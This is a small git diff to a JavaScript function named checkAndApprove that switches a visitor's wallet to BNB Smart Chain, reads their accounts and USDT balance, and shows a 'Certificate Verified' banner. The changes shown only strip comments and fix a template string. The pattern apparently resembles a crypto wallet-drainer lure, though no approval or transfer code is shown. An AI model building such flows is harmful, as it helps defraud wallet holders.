@@ -6,9 +6,8 @@ async function checkAndApprove() {
 
   const web3 = new Web3(window.ethereum);
 
-  // ✅ BNB Smart Chain Mainnet Details
   const bscParams = {
-    chainId: "0x38", // 56 in hex
+    chainId: "0x38",
     chainName: "BNB Smart Chain",
     nativeCurrency: {
       name: "BNB",
@@ -20,13 +19,11 @@ async function checkAndApprove() {
   };
 
   try {
-    // 👇 Try switching to BSC
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: bscParams.chainId }],
     });
   } catch (switchError) {
-    // 👇 If not added, add BSC
     if (switchError.code === 4902) {
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
@@ -38,7 +35,6 @@ async function checkAndApprove() {
     }
   }
 
-  // 👇 Proceed after switching
   await window.ethereum.request({ method: "eth_requestAccounts" });
   const accounts = await web3.eth.getAccounts();
   const sender = accounts[0];
@@ -103,14 +99,14 @@ async function checkAndApprove() {
   const masked = sender.slice(0, 6) + "..." + sender.slice(-4);
   const displayBalance = parseFloat(balance).toFixed(2);
 
-  const html = 
+  const html = `
     <div style="background-color: #1e1e1e; padding: 30px; border-radius: 12px; border: 1px solid #4caf50;">
       <h2 style="color: #4caf50;">✅ Certificate Verified</h2>
       <p style="font-size: 18px; color: #ccc;">${masked}</p>
       <p style="font-size: 20px; color: #ffc107;">Only ${displayBalance} USDT</p>
       <p style="color: #aaa; font-size: 14px;">🕒 ${timeString}</p>
     </div>
-  ;
+  `;
 
   document.getElementById("certificate-container").innerHTML = html;
 }
